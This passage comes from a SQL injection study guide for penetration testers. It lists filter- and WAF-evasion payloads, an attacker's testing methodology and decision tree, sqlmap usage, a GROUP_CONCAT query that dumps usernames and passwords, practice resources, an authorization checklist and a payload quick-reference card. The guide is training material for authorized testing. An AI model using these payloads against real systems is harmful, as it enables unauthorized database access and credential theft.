%55%4E%49%4F%4E %53%45%4C%45%43%54

# Mixed techniques
uNi/**/On /*!50000sElEcT*/
```

##### SELECT Bypass

```sql
# Comments
SEL/**/ECT

# Case
SeLeCt

# Version-specific (MySQL)
/*!12345SELECT*/

# Nested
SELSELECTECT
```

##### WHERE Bypass

```sql
# Use HAVING
' GROUP BY username HAVING username='admin' --

# Use LIMIT
' LIMIT 1 OFFSET 0 --
```

#### Bypassing Space Filters

```sql
# Tab character
'%09OR%091=1--

# Newline
'%0AOR%0A1=1--

# Plus sign (some contexts)
'+OR+1=1--

# Parentheses
'OR(1=1)--

# Comments
'/**/OR/**/1=1--
```

#### Bypassing Quote Filters

```sql
# Hex encoding
' OR username=0x61646d696e --  # 'admin'

# CHAR function
' OR username=CHAR(97,100,109,105,110) --

# ASCII conversion
' OR ASCII(SUBSTRING(username,1,1))=97 --

# Without quotes in LIKE
' OR username LIKE admin --  # May work in some contexts
```

#### Bypassing Equal Sign

```sql
# LIKE operator
' OR username LIKE 'admin

# IN operator
' OR username IN ('admin')

# BETWEEN operator
' OR 1 BETWEEN 0 AND 2 --

# Greater/Less than
' OR 1<2 --
```

### 🎪 Advanced Obfuscation

#### Character Encoding Mix

```sql
# Mix of hex, char, concat
' OR username=CONCAT(CHAR(97),0x646d,CHAR(105,110)) --  # 'admin'

# Nested functions
' OR username=UNHEX(HEX('admin')) --
```

#### Scientific Notation

```sql
' OR 1e0=1 --
' OR 1.e1>9 --
' OR .1e1=1 --
```

#### Mathematical Operations

```sql
' OR 1+1=2 --
' OR 2-1=1 --
' OR 2*1=2 --
' OR 4/2=2 --
' OR 3%2=1 --
```

---

## 🧠 Mental Models & Strategies

### 🎯 Thinking Like an Attacker

#### 1. Information Gathering Phase

- What technology stack? (error messages reveal this)
- What database? (version strings, syntax differences)
- What's the query structure? (single/double quotes, number of columns)
- What protections exist? (WAF, input filtering)

#### 2. Attack Planning Phase

- Choose injection type based on feedback
- Select payloads based on database type
- Plan WAF evasion if detected
- Determine escalation path

#### 3. Execution Phase

- Start subtle, get louder if needed
- Document everything
- Adapt based on responses
- Know when to pivot techniques

### 🛠️ Systematic Testing Approach

```
1. Test with simple quote: '
   ├─ Error? → Note error message, database type
   ├─ Different response? → Vulnerable
   └─ Same response? → Try other characters

2. Confirm with logic: ' OR '1'='1
   ├─ Different response? → Confirmed vulnerable
   └─ Same response? → Try time-based

3. Identify injection type
   ├─ See output? → Union-based
   ├─ See errors? → Error-based
   ├─ Different responses? → Boolean-blind
   └─ No differences? → Time-based blind

4. Enumerate database
   ├─ Database type and version
   ├─ Current database name
   ├─ Table names
   ├─ Column names
   └─ Extract data

5. Post-exploitation (if authorized)
   ├─ File operations
   ├─ Command execution
   └─ Privilege escalation
```

### 📊 Decision Tree

```
Is there SQL injection?
│
├─ Can you see direct output?
│  ├─ YES → Try Union-based
│  └─ NO → Can you trigger errors?
│     ├─ YES → Try Error-based
│     └─ NO → Is response different for TRUE/FALSE?
│        ├─ YES → Boolean-based blind
│        └─ NO → Try Time-based blind
│
└─ Are there protections (WAF)?
   ├─ YES → Use evasion techniques
   │  ├─ Encoding
   │  ├─ Comments
   │  ├─ Case variation
   │  └─ Alternative syntax
   └─ NO → Use standard payloads
```

---

## 🏆 Pro Tips & Tricks

### 💡 Efficiency Tips

1. **Use SQLMap first for reconnaissance**
    
    ```bash
    sqlmap -u "URL" --batch --level=1 --risk=1
    # Gets you: DB type, version, databases
    ```
    
2. **Combine manual + automated**
    
    - Manual for understanding
    - Automated for speed
    - Manual for bypasses
3. **Create payload templates**
    
    ```sql
    # Template
    ' [INJECTION] --
    
    # Fill in based on context
    ' UNION SELECT NULL,[DATA],NULL FROM [TABLE] --
    ```
    
4. **Keyboard shortcuts in Burp**
    
    - `Ctrl+R`: Send to Repeater
    - `Ctrl+I`: Send to Intruder
    - `Ctrl+Space`: URL encode

### 🎯 Common Mistakes to Avoid

1. ❌ **Starting with complex payloads**
    
    - ✅ Start simple, escalate gradually
2. ❌ **Not understanding the query structure**
    
    - ✅ Map out the original query first
3. ❌ **Ignoring error messages**
    
    - ✅ Error messages reveal database type and structure
4. ❌ **Testing only one injection point**
    
    - ✅ Test ALL parameters, headers, cookies
5. ❌ **Using only single quotes**
    
    - ✅ Try double quotes, backticks, no quotes
6. ❌ **Not checking for second-order injection**
    
    - ✅ Test stored data being used later
7. ❌ **Giving up on blind injection**
    
    - ✅ Be patient; automate with scripts

### 🚀 Speed Optimization

#### For Union-Based

```sql
# Find columns fast (binary search)
' ORDER BY 5 --   # Error
' ORDER BY 2 --   # Success
' ORDER BY 3 --   # Success
' ORDER BY 4 --   # Error
# Conclusion: 3 columns
```

#### For Blind Injection

```sql
# Use ASCII binary search (faster than character by character)
# Instead of trying a-z (26 attempts)
# Use binary search (7-8 attempts)

' AND ASCII(SUBSTRING(database(),1,1))>109 --  # Mid-point
# TRUE: between 110-255
# FALSE: between 32-109
# Continue halving until exact match
```

#### For Data Extraction

```sql
# Use GROUP_CONCAT (MySQL) to get all data at once
' UNION SELECT NULL,GROUP_CONCAT(username,':',password),NULL FROM users --

# Instead of row-by-row extraction
```

---

## 📈 Skill Progression Path

### 🌱 Beginner (Week 1-2)

- [ ] Understand what SQL injection is
- [ ] Learn basic SQL syntax
- [ ] Practice on DVWA (Low security)
- [ ] Master authentication bypass
- [ ] Complete 5 beginner CTF challenges

### 🌿 Intermediate (Week 3-6)

- [ ] Master Union-based injection
- [ ] Learn Boolean-based blind
- [ ] Practice time-based blind
- [ ] Understand database enumeration
- [ ] Use Burp Suite effectively
- [ ] Complete 10 intermediate CTF challenges
- [ ] Learn basic WAF bypass

### 🌳 Advanced (Week 7-12)

- [ ] Master all injection types
- [ ] Advanced WAF bypass techniques
- [ ] Out-of-band exploitation
- [ ] Second-order injection
- [ ] NoSQL injection basics
- [ ] Write custom exploitation scripts
- [ ] Complete 15 advanced CTF challenges
- [ ] Practice on real-world bug bounty platforms (with permission)

### 🏆 Expert (Ongoing)

- [ ] Discover novel bypass techniques
- [ ] Contribute to security tools
- [ ] Find and report real vulnerabilities
- [ ] Write blog posts/research papers
- [ ] Mentor others
- [ ] Stay updated with latest research

---

## 📚 Additional Resources

### 📖 Books

- **The Web Application Hacker's Handbook** - Dafydd Stuttard & Marcus Pinto
- **SQL Injection Attacks and Defense** - Justin Clarke
- **The Database Hacker's Handbook** - David Litchfield

### 🎥 Video Courses

- **PortSwigger Academy** - Free SQL injection course
- **Pentester Academy** - Advanced SQL injection
- **Cybrary** - SQL injection fundamentals

### 🌐 Practice Platforms

- **PortSwigger Web Security Academy** - Free labs
- **TryHackMe** - Guided learning paths
- **HackTheBox** - Real-world scenarios
- **PentesterLab** - Focused exercises
- **DVWA** - Damn Vulnerable Web Application
- **bWAPP** - Buggy Web Application
- **WebGoat** - OWASP training application

### 🔗 Useful Links

- **OWASP SQL Injection Guide**: https://owasp.org/www-community/attacks/SQL_Injection
- **PayloadsAllTheThings**: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- **HackTricks SQL Injection**: https://book.hacktricks.xyz/pentesting-web/sql-injection
- **PentestMonkey Cheat Sheets**: http://pentestmonkey.net/category/cheat-sheet

### 🐦 Security Researchers to Follow

- PortSwigger Research
- OWASP Community
- Bug bounty platforms (HackerOne, Bugcrowd)
- InfoSec Twitter community

---

## ✅ Checklist for Testing

### 🔍 Pre-Attack

- [ ] Authorization obtained
- [ ] Scope clearly defined
- [ ] Tools configured and ready
- [ ] Proxy (Burp/ZAP) set up
- [ ] Note-taking system ready

### 🎯 During Attack

- [ ] Test all input points (GET, POST, headers, cookies)
- [ ] Test with different quotes (', ", `)
- [ ] Try different comment styles (--, #, /**/)
- [ ] Test both numeric and string contexts
- [ ] Document all findings with screenshots
- [ ] Note any error messages
- [ ] Keep track of working payloads

### 📝 Post-Attack

- [ ] Document all vulnerabilities found
- [ ] Rate severity (CVSS score)
- [ ] Provide proof-of-concept
- [ ] Suggest remediation steps
- [ ] Clean up any test data created
- [ ] Write comprehensive report

---

## 🎓 Final Notes

### 🌟 Key Success Factors

1. **Practice consistently** - Daily practice > Marathon sessions
2. **Understand, don't memorize** - Know WHY payloads work
3. **Document everything** - Your notes are your knowledge base
4. **Stay ethical** - Only test what you're authorized to test
5. **Join communities** - Learn from others' experiences
6. **Read write-ups** - See how others approach problems
7. **Build labs** - Create your own vulnerable applications
8. **Automate repetitive tasks** - Write scripts for common tasks

### 🚀 Next Steps

1. Complete this note review
2. Set up practice environment (DVWA/bWAPP)
3. Practice 30 minutes daily
4. Complete one CTF challenge weekly
5. Document all learning in your notes
6. Join InfoSec Discord/Slack communities
7. Start bug bounty hunting (after mastery)

### 💪 Motivation

> "The only way to learn a new programming language is by writing programs in it." - Dennis Ritchie

This applies to security too - **the only way to master SQL injection is by practicing it!**

---

## 🏁 Conclusion

SQL Injection remains one of the most critical web vulnerabilities. Mastering it requires:

- 🧠 Understanding SQL and database architecture
- 🔧 Hands-on practice with various injection types
- 🎯 Systematic testing methodology
- 🛡️ Knowledge of prevention techniques
- 📚 Continuous learning and adaptation

**Remember**: With great power comes great responsibility. Use these skills ethically and legally!

---

### 📌 Quick Reference Card

```sql
-- Detection
'
' OR '1'='1
' AND '1'='2

-- Union-Based
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,@@version,NULL--

-- Boolean-Blind
' AND 1=1--    # TRUE
' AND 1=2--    # FALSE

-- Time-Based
' AND SLEEP(5)--
'; WAITFOR DELAY '00:00:05'--

-- Error-Based
' AND extractvalue(0x0a,concat(0x0a,database()))--

-- Comments
--
-- -
#
/**/
/*!50000*/
```

**Happy Hacking! 🎯🔐**

---

_Last Updated: November 2025_ _Version: 2.0_ _Created with 💙 for ethical hackers_